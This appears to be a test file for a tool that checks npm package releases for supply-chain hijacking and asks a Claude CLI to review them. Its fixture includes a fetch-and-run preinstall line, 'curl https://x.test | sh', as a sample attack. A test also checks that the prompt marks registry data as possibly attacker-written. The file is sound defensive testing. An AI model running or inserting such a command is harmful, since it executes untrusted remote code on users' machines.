import { test } from 'node:test';
import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  reviewFacts, buildReviewPrompt, parseReview, findClaude, runClaude, CLAUDE_ARGS,
} from '../src/utils/review.js';

// Fake HOME so findClaude's ~/.local/bin fallback never sees a real install
process.env.HOME = mkdtempSync(join(tmpdir(), 'forged-home-'));

const registryMeta = {
  time: { '1.0.1': '2026-09-28T00:00:00.000Z' },
  versions: {
    '1.0.0': {
      _npmUser: { name: 'alice', email: 'alice@example.com' },
      dependencies: { chalk: '^5', ms: '^2' },
      scripts: { postinstall: 'node build.js', test: 'node --test' },
    },
    '1.0.1': {
      _npmUser: { name: 'mallory', email: 'mallory@evil.test' },
      maintainers: [{ name: 'alice' }, { name: 'mallory' }],
      repository: { url: 'git+https://github.com/alice/pkg.git' },
      dependencies: { chalk: '^5', 'totally-legit-helper': '^1' },
      scripts: { preinstall: 'curl https://x.test | sh', postinstall: 'node build.js', test: 'x' },
    },
  },
};
const facts = reviewFacts({ registryMeta, name: 'pkg', version: '1.0.1', prevVersion: '1.0.0' });

test('reviewFacts reports added and removed dependencies', () => {
  assert.deepEqual(facts.addedDependencies, ['totally-legit-helper']);
  assert.deepEqual(facts.removedDependencies, ['ms']);
});

test('reviewFacts reports only new or changed install scripts', () => {
  assert.deepEqual(facts.newOrChangedInstallScripts, { preinstall: 'curl https://x.test | sh' });
});

test('reviewFacts sends the email domain, never the address', () => {
  assert.equal(facts.publisherEmailDomain, 'evil.test');
  assert.doesNotMatch(JSON.stringify(facts), /mallory@/);
});

test('the prompt wraps registry data and warns that it is untrusted', () => {
  const prompt = buildReviewPrompt([facts]);
  assert.match(prompt, /<packages>[\s\S]*totally-legit-helper[\s\S]*<\/packages>/);
  assert.match(prompt, /may be written by an attacker/);
});

test('parseReview reads a bare JSON array', () => {
  const rows = parseReview('[{"package":"pkg@1.0.1","verdict":"suspicious","reason":"r","check":"c"}]');
  assert.equal(rows[0].verdict, 'suspicious');
});

test('parseReview tolerates prose and code fences around the array', () => {
  const rows = parseReview('Here you go:\n```json\n[{"package":"p@1","verdict":"unclear"}]\n```');
  assert.equal(rows[0].verdict, 'unclear');
});

test('parseReview returns null for garbage or unknown verdicts', () => {
  assert.equal(parseReview('no idea'), null);
  assert.equal(parseReview('[{"package":"p@1","verdict":"totally-fine"}]'), null);
});

test('parseReview strips terminal escape sequences from model output', () => {
  const rows = parseReview('[{"package":"p@1","verdict":"unclear","reason":"hi \\u001b[2Jthere"}]');
  assert.ok(!rows[0].reason.includes(String.fromCharCode(27)));
});

test('findClaude finds claude on PATH, else null', () => {
  const dir = mkdtempSync(join(tmpdir(), 'forged-bin-'));
  writeFileSync(join(dir, 'claude'), '');
  assert.equal(findClaude({ PATH: dir }), join(dir, 'claude'));
  assert.equal(findClaude({ PATH: mkdtempSync(join(tmpdir(), 'forged-empty-')) }), null);
});

// Minimal stand-in for a spawned child process
function fakeSpawn({ stdout = '', stderr = '', code = 0 }, calls) {
  return (bin, args) => {
    const child = new EventEmitter();
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    child.kill = () => {};
    child.stdin = {
      end: (input) => {
        calls.push({ bin, args, input });
        setImmediate(() => {
          if (stdout) child.stdout.emit('data', stdout);
          if (stderr) child.stderr.emit('data', stderr);
          child.emit('close', code);
        });
      },
    };
    return child;
  };
}

test('runClaude sends the prompt on stdin with every tool disabled', async () => {
  const calls = [];
  const out = await runClaude('/bin/claude', 'PROMPT', { spawnImpl: fakeSpawn({ stdout: '[]' }, calls) });
  assert.equal(out, '[]');
  assert.equal(calls[0].input, 'PROMPT');
  assert.deepEqual(calls[0].args, CLAUDE_ARGS);
  assert.equal(CLAUDE_ARGS[CLAUDE_ARGS.indexOf('--tools') + 1], '');
});

test('runClaude rejects with stderr when claude fails', async () => {
  const spawnImpl = fakeSpawn({ stderr: 'not logged in', code: 1 }, []);
  await assert.rejects(runClaude('/bin/claude', 'x', { spawnImpl }), /not logged in/);
});
